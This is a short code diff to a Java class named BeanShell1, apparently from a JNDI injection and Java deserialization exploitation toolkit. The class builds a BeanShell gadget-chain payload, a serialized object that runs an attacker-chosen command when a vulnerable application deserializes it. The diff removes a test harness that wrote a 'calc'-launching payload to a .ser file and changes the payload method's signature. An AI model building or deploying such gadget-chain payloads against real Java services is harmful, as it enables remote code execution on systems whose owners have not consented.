@@ -7,21 +7,14 @@ import com.nu1r.jndi.gadgets.utils.Reflections;
 import com.nu1r.jndi.gadgets.utils.beanshell.BeanShellUtil;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.util.*;
 
 public class BeanShell1 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public static byte[] getBytes(PayloadType type) throws Exception {
         String      command = String.valueOf(type);
         String      payload = BeanShellUtil.makeBeanShellPayload(command);
         Interpreter i       = new Interpreter();
